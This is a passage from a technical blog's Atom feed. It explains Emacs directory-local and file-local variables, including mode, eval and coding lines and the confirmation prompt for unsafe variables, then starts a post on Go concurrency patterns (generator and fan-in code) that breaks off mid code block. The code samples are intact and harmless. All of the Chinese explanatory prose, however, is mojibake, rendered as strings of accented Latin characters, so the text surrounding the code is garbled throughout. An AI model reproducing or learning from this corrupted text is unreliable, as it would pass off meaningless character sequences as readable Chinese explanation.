&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;/usr/include/&amp;#34;&lt;/span> &lt;span class="ss">&amp;#39;unwritable-directory&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚æœä½ ä¸èƒ½ç›´æ¥åœ¨ç›®å½•ä¸‹åˆ›å»º &lt;code>.dir-locals.el&lt;/code> æ–‡ä»¶çš„è¯ï¼Œä¸Šé¢è¿™ç§æ–¹å¼å°±å¾ˆ
æœ‰ç”¨ã€‚&lt;/p>
&lt;h2 id="file-local-variables-æœ¬åœ°æ–‡ä»¶å˜é‡">file-local variables æœ¬åœ°æ–‡ä»¶å˜é‡&lt;/h2>
&lt;p>å¯ä»¥åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå®šä¹‰ï¼Œå¯ä»¥ä»¥æ³¨é‡Šçš„å½¢å¼å‡ºç°ï¼Œä¾‹å¦‚ elisp æ–‡ä»¶å¯ä»¥è¿™ä¹ˆ
å®šä¹‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; -*- mode: Lisp; fill-column: 75; comment-column: 50; -*-&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>org æ–‡ä»¶æŒ‡å®š org-download çš„å›¾ç‰‡ä¿å­˜è·¯å¾„ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span> &lt;span class="nv">-*-&lt;/span> &lt;span class="nv">mode:&lt;/span> &lt;span class="nv">Org&lt;/span>&lt;span class="c1">; org-download-image-dir: &amp;#34;./images&amp;#34;; -*-&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å…¶ä¸­ &lt;code>mode&lt;/code> å˜é‡æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ç”¨æ¥æŒ‡å®š major mode çš„ï¼Œç±»ä¼¼çš„ç‰¹æ®Šå˜é‡è¿˜æœ‰
&lt;code>eval&lt;/code>, &lt;code>coding&lt;/code> ç­‰ï¼Œåæ–‡æœ‰ä»‹ç»ã€‚&lt;/p>
&lt;p>å¦‚æœæ˜¯ shell è„šæœ¬ï¼Œç”±äºç¬¬ä¸€è¡Œç”¨äºæŒ‡å®šè„šæœ¬è§£é‡Šå™¨ï¼Œå› æ­¤å¯ä»¥å†™åœ¨ç¬¬äºŒè¡Œã€‚&lt;/p>
&lt;p>å¦‚æœä¸æƒ³æ‰‹å†™ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‡ ä¸ªå‘½ä»¤æ¥è‡ªåŠ¨ç¼–è¾‘ï¼š&lt;/p>
&lt;dl>
&lt;dt>add-file-local-variable-prop-line&lt;/dt>
&lt;dd>å¢åŠ å˜é‡å®šä¹‰&lt;/dd>
&lt;dt>delete-file-local-variable-prop-line&lt;/dt>
&lt;dd>åˆ é™¤å˜é‡å®šä¹‰&lt;/dd>
&lt;dt>copy-dir-locals-to-file-locals-prop-line&lt;/dt>
&lt;dd>æ‹·è´ directory-local
variables åˆ°ç¬¬ä¸€è¡Œ&lt;/dd>
&lt;/dl>
&lt;p>å¦ä¸€ç§æ–¹å¼ï¼Œæ˜¯åœ¨æ–‡ä»¶çš„æœ«å°¾é™„è¿‘ï¼ˆç¦»æœ«å°¾ä¸è¶…è¿‡3000è¡Œï¼‰å®šä¹‰ local
variables list:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* Local Variables: */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* mode: c */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* comment-column: 0 */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* End: */&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚æœä½ åœ¨æ–‡ä»¶ä¸­æœ‰ç±»ä¼¼çš„æ–‡æœ¬ï¼Œä½†æ˜¯ä¸å¸Œæœ›è¢«å½“ä½œ local variables listï¼Œå¯
ä»¥é€šè¿‡æ’å…¥ä¸€ä¸ªæ¢é¡µç¬¦ï¼ˆ^L, å‚è€ƒ&lt;a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Pages.html">Pages&lt;/a>ï¼‰æ¥æ’¤é”€è¯¥åŠŸèƒ½ï¼Œå› ä¸º Emacs åªä¼šåœ¨æœ€
åä¸€é¡µæŸ¥æ‰¾ local variables listã€‚&lt;/p>
&lt;h3 id="ä¸€äº›ç‰¹æ®Šå˜é‡">ä¸€äº›ç‰¹æ®Šå˜é‡&lt;/h3>
&lt;dl>
&lt;dt>mode&lt;/dt>
&lt;dd>æŒ‡å®š major mode&lt;/dd>
&lt;dt>eval&lt;/dt>
&lt;dd>è¿è¡Œ lisp è¡¨è¾¾å¼ï¼Œè¿”å›å€¼ä¼šè¢«å¿½ç•¥&lt;/dd>
&lt;dt>coding&lt;/dt>
&lt;dd>æŒ‡å®šæ–‡æ¡£çš„ç¼–ç ç³»ç»Ÿï¼Œè¯¦æƒ…å‚è€ƒ &lt;a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Coding-Systems.html">Coding Systems&lt;/a>&lt;/dd>
&lt;dt>unibyte&lt;/dt>
&lt;dd>æ˜¯å¦é‡‡æ · unibyte mode åŠ è½½æˆ–è€…ç¼–è¯‘ Emacs Lisp æ–‡ä»¶ï¼Œå‚è€ƒ
&lt;a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/Disabling-Multibyte.html#Disabling-Multibyte">Disabling Multibyte Characters&lt;/a>&lt;/dd>
&lt;/dl>
&lt;p>æ³¨æ„ï¼Œè¯·ä¸è¦ä½¿ç”¨ &lt;code>mode&lt;/code> å˜é‡æ¥æŒ‡å®š minor mode, è€Œåº”è¯¥ä½¿ç”¨ &lt;code>eval&lt;/code> è¿è¡Œ
lisp ä»£ç æ¥å¯ç”¨æˆ–å…³é—­ minor modeã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼Œä¼šæ‰“å¼€ eldoc-mode,
å¹¶å…³é—­ font-lock-modeï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; Local Variables:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; eval: (eldoc-mode)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; eval: (font-lock-mode -1)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; End:&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>
æœ€åï¼Œå¦‚æœä½ é€šè¿‡å‘½ä»¤åšäº†ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„é…ç½®ï¼Œæƒ³å¤åŸçš„è¯ï¼Œå¯ä»¥é€šè¿‡ &lt;code>M-x normal-mode&lt;/code> å‘½ä»¤æ¥æ ¹æ®æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹ï¼Œé‡ç½®æœ¬åœ°å˜é‡å’Œ major mode
è®¾ç½®ã€‚&lt;/p>
&lt;h2 id="å®‰å…¨æ€§é—®é¢˜">å®‰å…¨æ€§é—®é¢˜&lt;/h2>
&lt;p>ç”±äºåŠ è½½æœ¬åœ°å˜é‡å­˜åœ¨ä¸€å®šçš„å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥é™¤éæ˜¯ä¸€äº› Emacs è®¤ä¸ºæ˜¯å®‰å…¨çš„
å˜é‡ï¼Œå¦åˆ™ Emacs å°†å‘ä½ ç¡®è®¤æ˜¯å¦æ‰§è¡Œã€‚&lt;/p>
&lt;p>å½“ç„¶ï¼Œä½ å¯ä»¥é€šè¿‡ä¸€äº›é…ç½®æ¥æŒ‡å®šä½ è®¤ä¸ºæ˜¯å®‰å…¨çš„å˜é‡æˆ–è€…å‘½ä»¤ï¼Œè¯¦æƒ…è¯·å‚è€ƒ
&lt;a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Safe-File-Variables.html">Safe-File-Variables&lt;/a> ã€‚&lt;/p></content><category scheme="https://mincodes.com/tags/emacs/" term="Emacs" label="Emacs"/><category scheme="https://mincodes.com/tags/elisp/" term="Elisp" label="Elisp"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/></entry><entry><title type="text">Go å¹¶å‘æ¨¡å¼æ€»ç»“</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/go-concurrency-patterns/"/><id>https://mincodes.com/posts/go-concurrency-patterns/</id><updated>2023-12-16T09:35:38+08:00</updated><published>2022-03-11T00:00:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Go çš„å¹¶å‘å“²å­¦ Don&amp;rsquo;t Communicate by sharing memory, share memory by communicating. ä¸è¦é€šè¿‡å…±äº«å†…å­˜æ¥é€šä¿¡ï¼›ç›¸åï¼Œé€šè¿‡é€šä¿¡æ¥å…±äº«å†…å­˜ã€‚ Generator å‘ç”Ÿå™¨ Generator æŒ‡è¿”å›ä¸€ä¸ªâ€¦</summary><content type="html">&lt;h2 id="go-çš„å¹¶å‘å“²å­¦">Go çš„å¹¶å‘å“²å­¦&lt;/h2>
&lt;blockquote>
&lt;style>.org-center { margin-left: auto; margin-right: auto; text-align: center; }&lt;/style>
&lt;div class="org-center">
&lt;p>Don&amp;rsquo;t Communicate by sharing memory, share memory by communicating.&lt;/p>
&lt;p>ä¸è¦é€šè¿‡å…±äº«å†…å­˜æ¥é€šä¿¡ï¼›ç›¸åï¼Œé€šè¿‡é€šä¿¡æ¥å…±äº«å†…å­˜ã€‚&lt;/p>
&lt;/div>
&lt;/blockquote>
&lt;h2 id="generator-å‘ç”Ÿå™¨">Generator å‘ç”Ÿå™¨&lt;/h2>
&lt;p>Generator æŒ‡è¿”å›ä¸€ä¸ª chan çš„å‡½æ•°ã€‚è¿™æ˜¯ä¸€ç§ååˆ†å¸¸è§çš„ä½¿ç”¨ goroutine +
chan çš„æ–¹å¼ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ç§æ ‡å‡†ç”¨æ³•äº†ã€‚&lt;/p>
&lt;p>é‡‡ç”¨è¿™ç§æ–¹å¼ä½¿ç”¨ chan ååˆ†çš„å®‰å…¨ï¼Œä¸ä¼šå‡ºç°ä¸€äº› chan è¯¯ç”¨å¯¼è‡´çš„é”™è¯¯ï¼ˆä¾‹å¦‚å‘å·²ç»å…³é—­çš„ chan å†™å…¥æ•°æ®ç­‰ï¼‰ã€‚&lt;/p>
&lt;p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œä¼šå¼€ä¸€ä¸ª goroutine é€’å½’éå†æŒ‡å®šç›®å½•ï¼Œå¹¶å°†ç›®å½•ä¸‹çš„æ‰€æœ‰
json æ–‡ä»¶é€šè¿‡ chan åå‡ºå»ã€‚&lt;/p>
&lt;p>&lt;a id="code-snippet--walkJsonFiles">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">walkJsonFiles&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dir&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">defer&lt;/span> &lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">filepath&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WalkDir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dir&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">info&lt;/span> &lt;span class="nx">fs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DirEntry&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;can&amp;#39;t access path: %q: %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Type&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">IsDir&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">filepath&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s">&amp;#34;.json&amp;#34;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">path&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;error walking the path %q: %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">dir&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">out&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="multiplexing-å¤šè·¯å¤ç”¨-fan-in">Multiplexing å¤šè·¯å¤ç”¨ï¼ˆFan-Inï¼‰&lt;/h2>
&lt;p>ä¸‹é¢è¿™å¼ å›¾å¯ä»¥å½¢è±¡çš„è¡¨è¾¾ Fan-In çš„æ¦‚å¿µï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/2023-12-08_06-52-15_screenshot.png">
&lt;/figure>
&lt;h3 id="fan-in-å¤š-goroutine-ç‰ˆæœ¬">Fan-In: å¤š goroutine ç‰ˆæœ¬&lt;/h3>
&lt;p>&lt;a id="code-snippet--fanIn">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">fanIn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cs&lt;/span> &lt;span class="o">...&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">wg&lt;/span> &lt;span class="nx">sync&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">WaitGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// æ³¨æ„ï¼šè¿™é‡Œä¸èƒ½ç›´æ¥ wg.Wait()ï¼Œéœ€è¦å¼€ä¸€ä¸ª goroutine æ¥ Wait
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Wait&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">collect&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">defer&lt;/span> &lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Done&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">in&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">n&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cs&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Fan-In
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">cs&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="nf">collect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">out&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="fan-in-select-ç‰ˆæœ¬">Fan-In: select ç‰ˆæœ¬&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
